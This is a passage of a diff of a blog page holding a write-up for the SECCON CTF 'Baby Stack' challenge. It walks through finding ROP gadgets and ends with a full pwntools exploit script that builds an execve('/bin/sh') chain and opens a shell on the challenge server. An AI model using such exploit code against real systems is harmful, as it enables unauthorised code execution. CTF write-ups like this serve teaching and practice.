 <p>Now we need a special gadget for this, we need something that moves data from a register into a memory address, the ideal gadget would be <strong><code>MOV [RDI], RAX</code></strong>, with the preference that it’s a <strong>qword MOV</strong>, since <strong>/bin/sh</strong> is a quite <strong>big string</strong> we need a <strong>64bit MOV</strong> (if a 64 bit MOV weren’t available we could do it by spliting into multiple moves), so lets check with <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPGadgets</a>, if we have a 64bit MOV:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'mov qword ptr \[rdi\], '</span></span><br><span class="line">0x000000000045681b : clc ; mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret</span><br><span class="line">0x0000000000456826 : mov eax, dword ptr [rsi] ; mov qword ptr [rdi], rax ; ret</span><br><span class="line">0x0000000000456490 : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rax ; ret</span><br><span class="line">0x000000000045681c : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret</span><br><span class="line">0x0000000000456499 : mov qword ptr [rdi], rax ; ret</span><br><span class="line">0x0000000000456825 : mov rax, qword ptr [rsi] ; mov qword ptr [rdi], rax ; ret</span><br></pre></td></tr></table></figure>
 <p>There we go, the <strong><code>mov qword ptr [rdi], rax ; ret</code></strong> is the gadget we need! we just need to store the .bss address into <strong><code>RDI</code></strong>, and the string <strong>/bin/sh</strong> into <code>RAX</code>, to store them into <strong><code>RDI</code></strong> and <strong><code>RAX</code></strong> we need gadgets like <strong><code>POP RDI ; RET</code></strong> and <strong><code>POP RAX ; RET</code></strong>, this gadgets will get the value on the top of the stack and store it in the respective register that’s what <strong><code>POP</code></strong> does:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'pop rdi ;'</span></span><br><span class="line">0x000000000044a282 : pop rdi ; adc eax, 0x24448900 ; and byte ptr [rcx], bh ; ret</span><br><span class="line">0x000000000042274f : pop rdi ; add byte ptr [rax], al ; add rsp, 0x20 ; ret</span><br><span class="line">0x0000000000429eea : pop rdi ; call 0x401008</span><br><span class="line">0x0000000000470931 : pop rdi ; or byte ptr [rax + 0x39], cl ; ret</span><br><span class="line">$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'pop rax ; ret'</span></span><br><span class="line">0x00000000004016ea : pop rax ; ret</span><br><span class="line">0x0000000000429283 : pop rax ; ret 0xf66</span><br></pre></td></tr></table></figure>
-<p>We have both gadgets but as we can see the <strong><code>pop rdi ; or byte ptr [rax + 0x39], cl ; ret</code></strong> gadget has an instruction between <strong><code>POP RDI</code></strong> and <strong><code>RET</code></strong>, We require to set <strong><code>RAX</code></strong> into a valid address before using this gadget <strong>otherwise we SEGFAULT</strong>. </p>
+<p>We have both gadgets but as we can see the <strong><code>pop rdi ; or byte ptr [rax + 0x39], cl ; ret</code></strong> gadget has an instruction between <strong><code>POP RDI</code></strong> and <strong><code>RET</code></strong>, We require to set <strong><code>RAX</code></strong> into a valid address before using this gadget <strong>otherwise we SEGFAULT</strong>.</p>
 <p>Finally we have everything we need to store the address of /bin/sh into <code>RDI</code>:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setting /bin/sh into bss address</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000470931</span>) <span class="comment"># pop rdi ; or byte ptr [rax + 0x39], cl ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000456499</span>) <span class="comment"># mov qword ptr [rdi], rax ; ret</span></span><br></pre></td></tr></table></figure>
-<h4 id="Clearing-RSI-and-RDX"><a href="#Clearing-RSI-and-RDX" class="headerlink" title="Clearing RSI and RDX"></a>Clearing RSI and RDX</h4><p>Now that we have the address of <strong>/bin/sh</strong> in <strong><code>RDI</code></strong> we need to clear the registers <strong><code>RSI</code></strong> and <strong><code>RDX</code></strong> into zero, we can do this with <strong><code>POP RET</code></strong> gadgets : </p>
+<h4 id="clearing-rsi-and-rdx"><a class="markdownIt-Anchor" href="#clearing-rsi-and-rdx"></a> Clearing RSI and RDX</h4>
+<p>Now that we have the address of <strong>/bin/sh</strong> in <strong><code>RDI</code></strong> we need to clear the registers <strong><code>RSI</code></strong> and <strong><code>RDX</code></strong> into zero, we can do this with <strong><code>POP RET</code></strong> gadgets :</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># clear rsi and rdx registers</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x00000000004a247c</span>) <span class="comment"># pop rdx ; or byte ptr [rax - 0x77], cl ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">ropchain += p64(<span class="number">0x000000000046defd</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure>
 <p>And finally we can’t forget to set <strong><code>RAX</code></strong> into the execve system call number which is <strong><code>0x3b</code></strong>, you can get a full list of system call numbers at <a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener">https://filippo.io/linux-syscall-table/</a> , once again we can use <strong><code>POP RET</code></strong> gadget to do this:</p>
-<h4 id="Setting-0x3b-into-RAX"><a href="#Setting-0x3b-into-RAX" class="headerlink" title="Setting 0x3b into RAX"></a>Setting 0x3b into RAX</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setting rax into execve 0x3b syscall number</span></span><br><span class="line">ropchain += p64(<span class="number">0x00000000004016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call system call</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000456889</span>) <span class="comment"># syscall ; ret</span></span><br></pre></td></tr></table></figure>
+<h4 id="setting-0x3b-into-rax"><a class="markdownIt-Anchor" href="#setting-0x3b-into-rax"></a> Setting 0x3b into RAX</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setting rax into execve 0x3b syscall number</span></span><br><span class="line">ropchain += p64(<span class="number">0x00000000004016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call system call</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000456889</span>) <span class="comment"># syscall ; ret</span></span><br></pre></td></tr></table></figure>
 <p>My final Exploit will look like this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'baby_stack.pwn.seccon.jp'</span>, <span class="number">15285</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="keyword">False</span></span><br><span class="line">r = getConn()</span><br><span class="line"></span><br><span class="line">padding = <span class="string">'A'</span> * <span class="number">104</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line">BSS = <span class="number">0x59F920</span></span><br><span class="line">ropchain = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting /bin/sh into bss address</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000470931</span>) <span class="comment"># pop rdi ; or byte ptr [rax + 0x39], cl ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000456499</span>) <span class="comment"># mov qword ptr [rdi], rax ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clear rsi and rdx registers</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x00000000004a247c</span>) <span class="comment"># pop rdx ; or byte ptr [rax - 0x77], cl ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">ropchain += p64(<span class="number">0x000000000046defd</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># setting rax into execve 0x3b syscall number</span></span><br><span class="line">ropchain += p64(<span class="number">0x00000000004016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call system call</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000456889</span>) <span class="comment"># syscall ; ret</span></span><br><span class="line">r.sendline(padding + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x00</span>) + <span class="string">'A'</span>*<span class="number">80</span> + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x00</span>) + <span class="string">'A'</span>*<span class="number">192</span> + ropchain)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p>By running it we can get the flag:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python back_stack.py</span><br><span class="line">[+] Opening connection to baby_stack.pwn.seccon.jp on port 15285: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Thank you, !</span><br><span class="line">msg : </span><br><span class="line">$ ls</span><br><span class="line">baby_stack</span><br><span class="line">flag.txt</span><br><span class="line">$ id</span><br><span class="line">uid=30831 gid=30000(baby_stack) groups=30000(baby_stack)</span><br><span class="line">$ cat flag.txt</span><br><span class="line">SECCON&#123;<span class="string">'un54f3'</span>m0dul3_15_fr13ndly_70_4774ck3r5&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
       
     </div>
-    <footer class="article-footer">
-      <blockquote>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
   <ul class="post-copyright list-unstyled">
     
-    <li class="post-copyright-link">
-      <strong>Link to this article：</strong>
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
       <a href="https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/" title="[Pwn] SECCON - Baby Stack" target="_blank" rel="external">https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/</a>
     </li>
     
-    <!--li class="post-copyright-license">
+    <li class="post-copyright-license">
       <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
-    </li-->
+    </li>
   </ul>
 </blockquote>
 
@@ -460,93 +466,79 @@
 </div>
 
 
-    </footer>
+    </div>
   </article>
   
     
-  <div id="comments"></div>
+  <section id="comments">
+  	
+  </section>
 
-<!-- LiveRe City install code -->
-<!--<div id="comments">
-<div id="lv-container" data-id="city" data-uid="MTAyMC8zMDExMy82NjY4">
-	<script type="text/javascript">
-   (function(d, s) {
-       var j, e = d.getElementsByTagName(s)[0];
-
-       if (typeof LivereTower === 'function') { return; }
-
-       j = d.createElement(s);
-       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-       j.async = true;
-
-       e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-	</script>
-<noscript> Please activate JavaScript for write a comment in LiveRe</noscript>
-</div>
-</div>-->
-<!-- completed City install code -->
-<div id="disqus_thread"></div>
-<script>
-
-/**
-*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-/*
-var disqus_config = function () {
-this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-};
-*/
-(function() { // DON'T EDIT BELOW THIS LINE
-var d = document, s = d.createElement('script');
-s.src = 'https://teamrocketist.disqus.com/embed.js';
-s.setAttribute('data-timestamp', +new Date());
-(d.head || d.body).appendChild(s);
-})();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 
   
 </div>
 
   <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
   
   <ul class="pager pull-left">
     
     <li class="prev">
-      <a href="/2017/12/18/Reverse-3DS-Scared-Flag/" title="[Reverse] 3DS - Scared Flag"><i class="fa fa-angle-left" aria-hidden="true"></i>&nbsp;&nbsp;Newer</a>
+      <a href="/2017/12/18/Reverse-3DS-Scared-Flag/" title="[Reverse] 3DS - Scared Flag"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
     </li>
     
     
     <li class="next">
-      <a href="/2017/12/10/Reverse-SECCON-Powerful-Shell/" title="[Reverse] SECCON - Powerful_Shell">Older&nbsp;&nbsp;<i class="fa fa-angle-right" aria-hidden="true"></i></a>
+      <a href="/2017/12/10/Reverse-SECCON-Powerful-Shell/" title="[Reverse] SECCON - Powerful_Shell"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
+    
     
   </ul>
   
   
   
   <div class="bar-right">
+    
     <div class="share-component" data-sites="facebook,twitter" data-mobile-sites="facebook,twitter"></div>
+    
   </div>
-  
+  </div>
 </nav>
+  
 
-</section>
 
-  <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2022 TEAMROCKETIST
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
 <script>
 window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 </script>
-
-<script src="/js/jquery.fancybox.min.js"></script>
-<script src="/js/plugin.js"></script>
+<script src="/js/plugin.min.js"></script>
 <script src="/js/application.js"></script>
 
-
-
-  <script>
+    <script>
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
@@ -567,9 +559,48 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
-<!-- Google Analytics -->
-<script type="text/javascript">
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+
+   
+
+
+
+
+   
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+    <script defer type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
 (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
 m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
@@ -578,7 +609,6 @@ ga('create', 'UA-104385070-1', 'auto');
 ga('send', 'pageview');
 
 </script>
-<!-- End Google Analytics -->
 
 
 
